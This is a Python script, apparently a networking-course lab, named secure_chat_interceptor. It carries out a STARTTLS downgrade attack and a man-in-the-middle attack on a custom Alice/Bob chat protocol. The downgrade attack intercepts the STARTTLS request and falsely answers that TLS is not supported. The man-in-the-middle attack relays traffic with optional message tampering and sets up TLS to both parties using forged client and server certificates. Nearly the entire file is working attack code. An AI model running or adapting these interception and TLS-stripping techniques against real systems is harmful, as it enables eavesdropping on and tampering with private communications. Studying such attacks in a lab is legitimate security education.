#!/usr/bin/env python3

import socket
import sys
import ssl
from utils import *
from typing import Tuple


def fake_connection(server_name: str) -> Tuple[socket.socket]:
    """
    Creates fake connections to both server and client.
    @param: server_name: name of the server
    @return: List[fakerServersocket,clientSocket,fakeClientSocket]
    """
    # Creating a socket for server. (Trudy Faking Bob)
    fakeServSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    fakeServSock.bind(("", SERVERPORT))
    fakeServSock.listen(1)

    print("Fake Server Active. Waiting For Clients to join . . .")

    # Trudy connecting with Alice
    clientSock, clientAddr = fakeServSock.accept()
    print("Connection Request from:", clientAddr)

    # Trudy Faking Alice
    fakeClientSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Resolving IP from hostname(Fake Bob)
    try:
        host_ip = socket.gethostbyname(server_name)
    except socket.gaierror:
        print("Hostname could not be resolved. Exiting")
        sys.exit(1)

    # Connecting to Server(Fake Alice --> Bob)
    fakeClientSock.connect((host_ip, SERVERPORT))

    print("Connected to ", host_ip)

    return fakeServSock, clientSock, fakeClientSock


class DownGradeAttack:
    """
    class implementing downgrade attack
    """

    def __init__(self, client_name: str, server_name: str) -> None:
        # Initializing the class
        self.server_name = server_name
        self.client_name = client_name

    def forwarding(self, fwd_from: socket.socket, fwd_to: str, msg: str) -> None:
        """
        forwarding message from fwd_from to fwd_to.
        @param: fwd_from: socket from which message is to be forwarded
        @param: fwd_to: server name to be forwarded
        @return: True if connection is closed else False
        """
        print("sending ", msg, " to ", fwd_to)
        fwd_from.sendall(msg.encode(FORMAT))
        return msg == "chat_close"

    def down_grade_attack(self):
        """
        Implements downgrade attack and sends fake messages to server and client.
        """
        fakeServSock, clientSock, fakeClientSock = fake_connection(self.server_name)

        while True:
            # Forwarding messages from alice to bob
            recvd_data = clientSock.recv(BUFFSIZE)
            print("recieved ", recvd_data.decode(FORMAT), " from: ", self.client_name)
            if recvd_data.decode(FORMAT) != "chat_STARTTLS":
                if self.forwarding(
                    fakeClientSock, self.server_name, recvd_data.decode(FORMAT)
                ):
                    print("Closing connection with alice . . .")
                    break

                # reciving from bob & sending to alice
                recvd_data = fakeClientSock.recv(BUFFSIZE)
                print(
                    "recieved ", recvd_data.decode(FORMAT), " from ", self.server_name
                )

                if self.forwarding(
                    clientSock, self.client_name, recvd_data.decode(FORMAT)
                ):
                    print("Closing connection with bob . . .")
                    break

            else:
                print("sending chat_STARTTLS_NOT_SUPPORTED to ", self.client_name)
                clientSock.sendall("chat_STARTTLS_NOT_SUPPORTED".encode(FORMAT))
                print("Down grade attack is Succesfull")

        # closing the connections
        clientSock.close()
        fakeClientSock.close()
        fakeServSock.close()


class MITMAttack:
    """
    Class implementing Man In the Middle Attack.
    """

    def __init__(self, client_name: str, server_name: str) -> None:
        # Initializing the class
        self.server_name = server_name
        self.client_name = client_name

    def close_chat(self, sender: str, receiver: str, recvd_data: bytes) -> bool:
        """
        Closes the chat if the message is `chat_close`.

        @param: sender: name of the sender
        @param: receiver: name of the receiver
        @param: recvd_data: message received from sender
        @return: True if connection is closed else False
        """
        if recvd_data.decode(FORMAT) == "chat_close":
            print(f"Received {recvd_data.decode(FORMAT)} from {sender}")
            print(f"Closing connection with {receiver}")
            return True

        return False

    def load_keys_and_cert(
        self, sslMethod: int, root_store_path: str, cert_path: str, private_key: str
    ):
        """
        Loads the keys and certificates.
        @param: sslMethod: ssl method to be used
        @param: root_store_path: path of the root store
        @param: cert_path: path of the certificate
        @param: private_key: path of the private key
        @return: ssl context
        """
        context = ssl.SSLContext(sslMethod)
        context.load_cert_chain(cert_path, private_key)
        context.load_verify_locations(root_store_path)
        context.verify_mode = ssl.CERT_REQUIRED
        return context

    def change_message(
        self, recvd_data: bytes, sock: socket.socket, receiver: str, sender: str
    ) -> str:
        choice = input("Do you like to change the message? (y/n)")
        if choice == "y":
            msg = input("Enter message to be sent: ")
            print("Trudy Tampered the message \U0001F608 \U0001F608 from ", sender)
            sock.sendall(msg.encode(FORMAT))
        else:
            print("sending ", recvd_data.decode(FORMAT), " to ", receiver)
            sock.sendall(recvd_data)

    def man_in_the_middle(self):
        """
        Implements man in the middle attack.
        """
        fakeServSock, clientSock, fake_clientsock = fake_connection(self.server_name)

        isStartTLS = False
        while True:
            # recieving from alice & sending to bob
            recvd_data = clientSock.recv(BUFFSIZE)
            print("recieved ", recvd_data.decode(FORMAT), " from ", self.client_name)

            # changing message 😈
            self.change_message(
                recvd_data, fake_clientsock, self.server_name, self.client_name
            )
            if self.close_chat("alice", "bob", recvd_data):
                break

            # reciving from bob & sending to alice
            recvd_data = fake_clientsock.recv(BUFFSIZE)
            print("recieved ", recvd_data.decode(FORMAT), " from ", self.server_name)

            self.change_message(
                recvd_data, clientSock, self.client_name, self.server_name
            )

            if not isStartTLS and recvd_data.decode(FORMAT) == "chat_STARTTLS_ACK":

                context = self.load_keys_and_cert(
                    ssl.PROTOCOL_TLS_CLIENT,
                    ROOTSTORE,
                    FAKECLIENTCERT,
                    FAKECLIENTPRIVATEKEY,
                )
                fake_clientsock = context.wrap_socket(
                    fake_clientsock,
                    server_hostname=self.server_name,
                    do_handshake_on_connect=True,
                )
                print("SSL Certificates Verified Succesfully")
                print("Secure TLS 1.3 pipe is established between Bob & Trudy")

                # Loading Keys and Certificates of fake Bob
                context = self.load_keys_and_cert(
                    ssl.PROTOCOL_TLS_SERVER,
                    ROOTSTORE,
                    FAKESERVERCERT,
                    FAKESERVERPRIVATEKEY,
                )

                clientSock = context.wrap_socket(
                    clientSock, server_side=True, do_handshake_on_connect=True
                )
                print("Secure TLS 1.3 pipe Established between Trudy & Alice")
                isStartTLS = True
                print("M I T M attack is Succesfull")

            if self.close_chat("bob", "alice", recvd_data):
                break

        # closing the connections
        clientSock.close()
        fake_clientsock.close()
        fakeServSock.close()


if __name__ == "__main__":
    if len(sys.argv) == 4 and sys.argv[1] == "-d":
        down_grade_attack = DownGradeAttack(sys.argv[2], sys.argv[3])
        down_grade_attack.down_grade_attack()

    elif len(sys.argv) == 4 and sys.argv[1] == "-m":
        mitm = MITMAttack(sys.argv[2], sys.argv[3])
        mitm.man_in_the_middle()
    else:
        print(
            """Usage:\n
            down grade attack: python3 -d <client> <server>\n
            MITM attack:python3 secure_chat_interceptor -m <client> <server>"""
        )
        exit(1)
